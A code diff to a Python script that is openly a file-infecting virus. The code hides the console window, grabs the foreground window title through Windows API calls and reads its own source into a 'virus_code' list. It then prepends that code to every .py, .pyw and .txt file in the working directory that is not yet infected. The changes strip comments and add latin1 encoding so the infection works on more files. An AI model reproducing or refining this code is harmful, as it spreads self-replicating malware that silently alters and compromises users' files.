@@ -2,28 +2,27 @@
 import tkinter as tk
 import sys
 import glob
-import ctypes       # For interfacing with C functions
+import ctypes
 
-kernel32 = ctypes.windll.kernel32   # Access functions from kernel32.dll
-user32 = ctypes.windll.user32       # Access functions from user32.dll
+kernel32 = ctypes.windll.kernel32
+user32 = ctypes.windll.user32
 
-user32.ShowWindow(kernel32.GetConsoleWindow(), 0)   # Hide console
+user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
 
-def get_current_window():  # Function to grab the current window and its title
+def get_current_window():
 
-    # Required WinAPI functions
     GetForegroundWindow = user32.GetForegroundWindow
     GetWindowTextLength = user32.GetWindowTextLengthW
     GetWindowText = user32.GetWindowTextW
-    hwnd = GetForegroundWindow()  # Get handle to foreground window
-    length = GetWindowTextLength(hwnd)  # Get length of the window text in title bar, passing the handle as argument
-    buff = ctypes.create_unicode_buffer(length + 1)  # Create buffer to store the window title string
-    GetWindowText(hwnd, buff, length + 1)  # Get window title and store in buff
-    return buff.value  # Return the value of buff
+    hwnd = GetForegroundWindow()
+    length = GetWindowTextLength(hwnd)
+    buff = ctypes.create_unicode_buffer(length + 1)
+    GetWindowText(hwnd, buff, length + 1)
+    return buff.value
 
 virus_code = []
 
-with open(sys.argv[0], 'r') as f:
+with open(sys.argv[0], 'r',encoding="latin1") as f:
     lines = f.readlines()
 
 
@@ -39,7 +38,7 @@ for line in lines:
 python_files = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*.txt')
 
 for file in python_files:
-    with open(file, 'r') as f:
+    with open(file, 'r',encoding="latin1") as f:
         file_code = f.readlines()
 
     infected = False
@@ -55,7 +54,7 @@ for file in python_files:
         final_code.extend('\n')
         final_code.extend(file_code)
 
-        with open(file, 'w') as f:
+        with open(file, 'w',encoding="latin1") as f:
             f.writelines(final_code)
 
 
